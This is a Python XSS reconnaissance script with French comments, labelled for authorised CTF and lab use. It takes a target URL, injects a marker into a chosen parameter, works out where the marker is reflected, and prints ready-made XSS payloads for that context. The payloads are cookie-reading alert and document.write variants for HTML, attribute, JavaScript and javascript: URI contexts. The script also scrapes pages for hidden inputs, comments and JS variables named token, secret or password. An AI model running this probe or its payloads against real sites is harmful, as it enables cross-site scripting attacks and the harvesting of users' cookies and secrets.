#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════╗
║   XSS CONTEXT ANALYZER — DOM & Source Inspector         ║
║   Auteur : ML | GitHub : exploit4040                    ║
║   Usage  : python3 xss_context_analyzer.py             ║
║   ⚠️  CTF / Labs autorisés uniquement                   ║
╚══════════════════════════════════════════════════════════╝

Ce script :
1. Analyse le code source d'une page
2. Détecte automatiquement le contexte XSS
3. Recommande les meilleurs payloads selon le contexte
4. Cherche les flags, cookies, variables JS cachées
5. Génère un rapport détaillé
"""

import requests
import re
import sys
import json
from bs4 import BeautifulSoup
from urllib.parse import urlparse, parse_qs
from colorama import Fore, Back, Style, init
from datetime import datetime

init(autoreset=True)

# ═══════════════════════════════════════════════════════════
# PAYLOADS PAR CONTEXTE
# ═══════════════════════════════════════════════════════════

CONTEXT_PAYLOADS = {
    "html_direct": [
        "<script>alert(document.cookie)</script>",
        "<img src=x onerror=alert(document.cookie)>",
        "<svg onload=alert(document.cookie)>",
        "<details open ontoggle=alert(document.cookie)>",
        "<body onload=alert(document.cookie)>",
    ],
    "html_attribute_double": [
        '" onmouseover="alert(document.cookie)',
        '" onfocus="alert(document.cookie)" autofocus="',
        '"><script>alert(document.cookie)</script>',
        '"><svg onload=alert(document.cookie)>',
        '"><img src=x onerror=alert(document.cookie)>',
    ],
    "html_attribute_single": [
        "' onmouseover='alert(document.cookie)",
        "' onfocus='alert(document.cookie)' autofocus='",
        "'><script>alert(document.cookie)</script>",
        "'><svg onload=alert(document.cookie)>",
        "'><img src=x onerror=alert(document.cookie)>",
    ],
    "javascript_double": [
        '";alert(document.cookie)//',
        '"+alert(document.cookie)+"',
        '";document.write(document.cookie)//',
    ],
    "javascript_single": [
        "';alert(document.cookie)//",
        "'+alert(document.cookie)+'",
        "';document.write(document.cookie)//",
    ],
    "javascript_template": [
        "${alert(document.cookie)}",
        "`+alert(document.cookie)+`",
        "${document.write(document.cookie)}",
    ],
    "href_src": [
        "javascript:alert(document.cookie)",
        "javascript:document.write(document.cookie)",
    ],
    "unknown": [
        "<script>alert(document.cookie)</script>",
        "<img src=x onerror=alert(document.cookie)>",
        "<svg onload=alert(document.cookie)>",
        '"><script>alert(document.cookie)</script>',
        "'><script>alert(document.cookie)</script>",
        '";alert(document.cookie)//',
    ],
}

FLAG_REGEX = re.compile(r'(FLAG|CTF|flag|ctf)\{[^}]+\}', re.IGNORECASE)

# ═══════════════════════════════════════════════════════════
# BANNER
# ═══════════════════════════════════════════════════════════

def banner():
    print(Fore.CYAN + """
╔════════════════════════════════════════════════════════════════════╗
║   🔍  XSS CONTEXT ANALYZER  —  exploit4040 (ML)                  ║
║   Analyse le contexte → recommande les payloads adaptés           ║
╚════════════════════════════════════════════════════════════════════╝
    """)

# ═══════════════════════════════════════════════════════════
# ANALYSE SOURCE
# ═══════════════════════════════════════════════════════════

def fetch_page(url, session, params=None):
    try:
        r = session.get(url, params=params, timeout=10)
        return r.text, r.status_code, r.cookies
    except Exception as e:
        print(Fore.RED + f"[ERREUR] {e}")
        return "", 0, {}

def detect_marker_context(html, marker):
    """Détecte le contexte dans lequel le marker est reflété"""
    idx = html.lower().find(marker.lower())
    if idx == -1:
        return None, None

    # Extrait du contexte autour du marker
    start = max(0, idx - 200)
    end   = min(len(html), idx + 200)
    ctx   = html[start:end]

    # Contexte SCRIPT (JS)
    if re.search(r'<script[^>]*>.*?' + re.escape(marker), html[:idx+len(marker)], re.DOTALL | re.IGNORECASE):
        # Dans quelle quote ?
        before = html[max(0, idx-50):idx]
        if '"' in before.split('\n')[-1]:
            return "javascript_double", ctx
        elif "'" in before.split('\n')[-1]:
            return "javascript_single", ctx
        elif '`' in before.split('\n')[-1]:
            return "javascript_template", ctx
        return "javascript_double", ctx

    # Contexte ATTRIBUT
    before = html[max(0, idx-100):idx]
    if re.search(r'=\s*"[^"]*$', before):
        return "html_attribute_double", ctx
    if re.search(r"=\s*'[^']*$", before):
        return "html_attribute_single", ctx

    # Contexte HREF/SRC
    if re.search(r'(href|src|action)\s*=\s*["\']?[^"\'>\s]*$', before, re.IGNORECASE):
        return "href_src", ctx

    # Contexte HTML direct
    if re.search(r'>[^<]*$', before):
        return "html_direct", ctx

    return "unknown", ctx

def analyze_js_variables(html):
    """Cherche les variables JS dans le source"""
    findings = {}

    # Variables avec 'flag', 'token', 'secret', 'key'
    keywords = ['flag', 'token', 'secret', 'key', 'password', 'auth', 'ctf']
    for kw in keywords:
        pattern = rf'(?:var|let|const)\s+(\w*{kw}\w*)\s*=\s*["\']?([^"\';\n]+)["\']?'
        matches = re.findall(pattern, html, re.IGNORECASE)
        for name, val in matches:
            findings[name] = val.strip()

    return findings

def analyze_hidden_inputs(html):
    """Cherche les inputs cachés"""
    soup = BeautifulSoup(html, 'html.parser')
    hidden = {}
    for inp in soup.find_all('input', type='hidden'):
        name  = inp.get('name', 'unknown')
        value = inp.get('value', '')
        if value:
            hidden[name] = value
    return hidden

def analyze_comments(html):
    """Cherche les commentaires HTML intéressants"""
    comments = re.findall(r'<!--(.*?)-->', html, re.DOTALL)
    interesting = []
    keywords = ['flag', 'token', 'secret', 'password', 'key', 'ctf', 'hint', 'todo']
    for c in comments:
        if any(k in c.lower() for k in keywords):
            interesting.append(c.strip())
    return interesting

def analyze_meta_tags(html):
    """Analyse les meta tags"""
    soup = BeautifulSoup(html, 'html.parser')
    metas = {}
    for meta in soup.find_all('meta'):
        name    = meta.get('name') or meta.get('property', '')
        content = meta.get('content', '')
        if name and content:
            metas[name] = content
    return metas

def find_forms_and_params(html, base_url):
    """Identifie tous les points d'injection"""
    soup = BeautifulSoup(html, 'html.parser')
    injection_points = []

    # Formulaires
    for form in soup.find_all('form'):
        action = form.get('action', base_url)
        method = form.get('method', 'get').upper()
        inputs = []
        for inp in form.find_all(['input', 'textarea', 'select']):
            inp_name = inp.get('name')
            inp_type = inp.get('type', 'text')
            if inp_name and inp_type not in ['hidden', 'submit', 'button']:
                inputs.append({'name': inp_name, 'type': inp_type})
        if inputs:
            injection_points.append({
                'type': 'FORM',
                'action': action,
                'method': method,
                'inputs': inputs
            })

    # Paramètres URL
    parsed = urlparse(base_url)
    params = parse_qs(parsed.query)
    if params:
        injection_points.append({
            'type': 'URL',
            'params': list(params.keys())
        })

    return injection_points

def check_security_headers(headers):
    """Vérifie les headers de sécurité"""
    security = {}
    checks = {
        'Content-Security-Policy': 'CSP',
        'X-XSS-Protection': 'XSS Protection',
        'X-Frame-Options': 'Clickjacking',
        'X-Content-Type-Options': 'MIME Sniffing',
        'Strict-Transport-Security': 'HSTS',
    }
    for header, name in checks.items():
        val = headers.get(header)
        security[name] = val if val else '❌ ABSENT'
    return security

# ═══════════════════════════════════════════════════════════
# RAPPORT
# ═══════════════════════════════════════════════════════════

def print_section(title, color=Fore.CYAN):
    print(color + f"\n{'─'*70}")
    print(color + f"  {title}")
    print(color + f"{'─'*70}")

def generate_report(url, html, status, cookies, headers, marker):
    print_section("🔍 INFORMATIONS GÉNÉRALES", Fore.CYAN)
    print(Fore.WHITE + f"  URL     : {url}")
    print(Fore.WHITE + f"  Status  : {status}")
    print(Fore.WHITE + f"  Taille  : {len(html)} bytes")
    print(Fore.WHITE + f"  Titre   : {re.search(r'<title>(.*?)</title>', html, re.I).group(1) if re.search(r'<title>(.*?)</title>', html, re.I) else 'N/A'}")

    # Headers sécurité
    print_section("🛡️ HEADERS SÉCURITÉ", Fore.YELLOW)
    sec = check_security_headers(headers)
    for name, val in sec.items():
        color = Fore.GREEN if val != '❌ ABSENT' else Fore.RED
        print(color + f"  {name:20} : {val}")

    # Cookies
    print_section("🍪 COOKIES", Fore.MAGENTA)
    if cookies:
        for k, v in cookies.items():
            print(Fore.MAGENTA + f"  {k:20} = {v}")
    else:
        print(Fore.RED + "  Aucun cookie détecté")

    # Flags
    print_section("🚩 FLAGS CTF", Fore.RED)
    flags = FLAG_REGEX.findall(html)
    if flags:
        print(Fore.RED + Back.WHITE + f"\n  ⚠️  {len(flags)} FLAG(S) TROUVÉ(S) !")
        for f in set(flags):
            print(Fore.RED + Back.WHITE + f"  ➤  {f}")
    else:
        print(Fore.WHITE + "  Aucun flag trouvé directement.")

    # Variables JS
    print_section("⚙️ VARIABLES JS INTÉRESSANTES", Fore.YELLOW)
    js_vars = analyze_js_variables(html)
    if js_vars:
        for name, val in js_vars.items():
            print(Fore.YELLOW + f"  {name:25} = {val[:80]}")
    else:
        print(Fore.WHITE + "  Aucune variable sensible trouvée.")

    # Inputs cachés
    print_section("🔒 INPUTS CACHÉS", Fore.YELLOW)
    hidden = analyze_hidden_inputs(html)
    if hidden:
        for name, val in hidden.items():
            print(Fore.YELLOW + f"  {name:25} = {val[:80]}")
    else:
        print(Fore.WHITE + "  Aucun input caché intéressant.")

    # Commentaires
    print_section("💬 COMMENTAIRES HTML SENSIBLES", Fore.YELLOW)
    comments = analyze_comments(html)
    if comments:
        for c in comments[:5]:
            print(Fore.YELLOW + f"  <!-- {c[:100]} -->")
    else:
        print(Fore.WHITE + "  Aucun commentaire sensible.")

    # Points d'injection
    print_section("💉 POINTS D'INJECTION DÉTECTÉS", Fore.GREEN)
    points = find_forms_and_params(html, url)
    if points:
        for p in points:
            if p['type'] == 'FORM':
                print(Fore.GREEN + f"  📝 FORM [{p['method']}] {p['action']}")
                for inp in p['inputs']:
                    print(Fore.GREEN + f"     └─ input[{inp['type']}] name={inp['name']}")
            else:
                print(Fore.GREEN + f"  🔗 URL PARAMS : {p['params']}")
    else:
        print(Fore.WHITE + "  Aucun point d'injection évident.")

    # Contexte du marker
    if marker:
        print_section(f"🎯 CONTEXTE DU MARKER '{marker}'", Fore.CYAN)
        context_type, ctx_snippet = detect_marker_context(html, marker)
        if context_type:
            print(Fore.GREEN + f"  ✅ Marker reflété ! Contexte : {context_type.upper()}")
            print(Fore.LIGHTBLUE_EX + f"\n  Extrait :")
            print(Fore.LIGHTBLUE_EX + f"  ┌{'─'*60}")
            if ctx_snippet:
                for line in ctx_snippet.split('\n')[:8]:
                    print(Fore.LIGHTBLUE_EX + f"  │ {line[:100]}")
            print(Fore.LIGHTBLUE_EX + f"  └{'─'*60}")

            print_section(f"💡 PAYLOADS RECOMMANDÉS pour contexte [{context_type.upper()}]", Fore.GREEN)
            for pl in CONTEXT_PAYLOADS.get(context_type, CONTEXT_PAYLOADS["unknown"]):
                print(Fore.GREEN + f"  ► {pl}")
        else:
            print(Fore.RED + f"  ❌ Marker '{marker}' non réfléchi dans la page.")
            print(Fore.YELLOW + "     → Le paramètre n'est peut-être pas vulnérable, ou la valeur est encodée.")

    return {
        "url": url,
        "status": status,
        "cookies": dict(cookies),
        "flags": list(set(FLAG_REGEX.findall(html))),
        "js_vars": js_vars,
        "hidden_inputs": hidden,
        "comments": comments,
        "injection_points": points,
        "security_headers": sec,
    }

# ═══════════════════════════════════════════════════════════
# MAIN
# ═══════════════════════════════════════════════════════════

def main():
    banner()

    url = input(Fore.CYAN + "[?] URL cible (ex: https://site.com/page.php?id=1) : " + Style.RESET_ALL).strip()
    if not url.startswith("http"):
        url = "https://" + url

    marker = input(Fore.CYAN + "[?] Marker de test (laisser vide = XSS_TEST_ML) : " + Style.RESET_ALL).strip()
    if not marker:
        marker = "XSS_TEST_ML"

    param = input(Fore.CYAN + "[?] Paramètre à tester (ex: q, id, search — laisser vide = auto) : " + Style.RESET_ALL).strip()

    session = requests.Session()
    session.headers.update({
        "User-Agent": "Mozilla/5.0 (XSS-Analyzer exploit4040)",
        "Accept": "text/html,application/xhtml+xml,*/*"
    })

    print(Fore.YELLOW + f"\n[*] Chargement de la page...")
    html, status, cookies = fetch_page(url, session)
    if not html:
        print(Fore.RED + "[!] Impossible de charger la page.")
        return

    print(Fore.YELLOW + f"[*] Page chargée ({len(html)} bytes, HTTP {status})\n")

    # Injecter le marker si un paramètre est spécifié
    if param:
        from urllib.parse import urlparse as _up, parse_qs as _pq, urlencode as _ue
        parsed = _up(url)
        params = _pq(parsed.query)
        params[param] = marker
        q = _ue({k: (v[0] if isinstance(v,list) else v) for k,v in params.items()})
        marker_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{q}"

        print(Fore.YELLOW + f"[*] Test du marker sur : {marker_url}")
        html, status, cookies = fetch_page(marker_url, session)

    # Générer le rapport
    try:
        r = session.get(url, timeout=5)
        resp_headers = dict(r.headers)
    except:
        resp_headers = {}

    print(Fore.CYAN + f"\n{'═'*70}")
    print(Fore.CYAN + f"  📊 RAPPORT D'ANALYSE — {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print(Fore.CYAN + f"{'═'*70}")

    report = generate_report(url, html, status, cookies, resp_headers, marker)

    # Sauvegarde
    print()
    save = input(Fore.CYAN + "[?] Sauvegarder le rapport JSON ? (o/n) : " + Style.RESET_ALL).strip().lower()
    if save == 'o':
        fname = f"xss_analysis_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        with open(fname, 'w', encoding='utf-8') as f:
            json.dump(report, f, indent=2, ensure_ascii=False)
        print(Fore.GREEN + f"[✓] Rapport sauvegardé : {fname}")

    print(Fore.YELLOW + "\n[✓] Analyse terminée. Utilise xss_scanner_v3.py pour le scan complet.\n")

if __name__ == "__main__":
    main()
